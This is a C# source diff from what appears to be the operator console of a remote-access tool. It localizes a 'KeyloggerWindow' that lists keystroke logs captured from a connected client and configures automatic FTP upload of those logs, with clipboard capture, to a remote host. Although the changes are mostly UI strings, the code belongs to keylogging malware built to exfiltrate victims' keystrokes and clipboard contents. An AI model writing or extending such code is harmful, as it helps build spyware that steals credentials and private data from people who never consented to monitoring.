@@ -14,6 +14,7 @@ public partial class KeyloggerWindow : ThemedWindow
     private readonly TlsServer _server;
     private readonly string    _clientId;
     private bool               _capturing;
+    private bool               _ftpConfigured;
     private string             _currentFilename = "";
     private readonly DispatcherTimer _autoRefresh = new() { Interval = TimeSpan.FromSeconds(15) };
 
@@ -72,8 +73,21 @@ public partial class KeyloggerWindow : ThemedWindow
         if (MnuKlDelete     != null) MnuKlDelete.Header   = Lang.Get("ACT_DELETE");
         if (MnuKlCopyName   != null) MnuKlCopyName.Header = Lang.Get("ACT_COPY_NAME");
         if (MnuKlRefresh    != null) MnuKlRefresh.Header  = Lang.Get("ACT_REFRESH");
-        if (BtnDownloadFile != null) BtnDownloadFile.Content = Lang.Get("ACT_DOWNLOAD");
-        if (BtnDeleteFile   != null) BtnDeleteFile.Content   = Lang.Get("ACT_DELETE");
+        if (BtnDownloadFile     != null) BtnDownloadFile.Content     = Lang.Get("ACT_DOWNLOAD");
+        if (BtnDeleteFile       != null) BtnDeleteFile.Content       = Lang.Get("ACT_DELETE");
+        if (TxtLogFilesHeader   != null) TxtLogFilesHeader.Text      = Lang.Get("KL_LOG_FILES");
+        if (BtnSaveAsTxt        != null) BtnSaveAsTxt.Content        = Lang.Get("KL_SAVE_AS_TXT");
+        if (TxtAutoUploadLabel  != null) TxtAutoUploadLabel.Text     = Lang.Get("KL_AUTO_UPLOAD");
+        if (TxtFtpHostLabel     != null) TxtFtpHostLabel.Text        = Lang.Get("KL_FTP_HOST");
+        if (TxtFtpPortLabel     != null) TxtFtpPortLabel.Text        = Lang.Get("KL_FTP_PORT");
+        if (TxtFtpUserLabel     != null) TxtFtpUserLabel.Text        = Lang.Get("KL_FTP_USER");
+        if (TxtFtpPassLabel     != null) TxtFtpPassLabel.Text        = Lang.Get("KL_FTP_PASSWORD");
+        if (TxtFtpPathLabel     != null) TxtFtpPathLabel.Text        = Lang.Get("KL_FTP_REMOTE_PATH");
+        if (TxtMaxSizeKbLabel   != null) TxtMaxSizeKbLabel.Text      = Lang.Get("KL_FTP_MAX_SIZE_KB");
+        if (ChkClipboard        != null) ChkClipboard.Content        = Lang.Get("KL_FTP_CLIPBOARD");
+        if (BtnFtpApply         != null) BtnFtpApply.Content         = Lang.Get("KL_FTP_APPLY");
+        if (TxtFtpStatus != null && !_ftpConfigured)
+            TxtFtpStatus.Text = Lang.Get("KL_NOT_CONFIGURED");
         if (TxtViewerTitle  != null && string.IsNullOrEmpty(_currentFilename))
             TxtViewerTitle.Text = Lang.Get("KL_SELECT_FILE");
     }
@@ -222,7 +236,8 @@ public partial class KeyloggerWindow : ThemedWindow
                 Type = PacketType.KeyloggerFtpConfig,
                 Data = JsonConvert.SerializeObject(cfg)
             });
-            TxtFtpStatus.Text = $"Config applied — threshold {maxKb} KB";
+            _ftpConfigured = true;
+            TxtFtpStatus.Text = string.Format(Lang.Get("KL_FTP_APPLIED"), maxKb);
         }
         catch (Exception ex)
         {
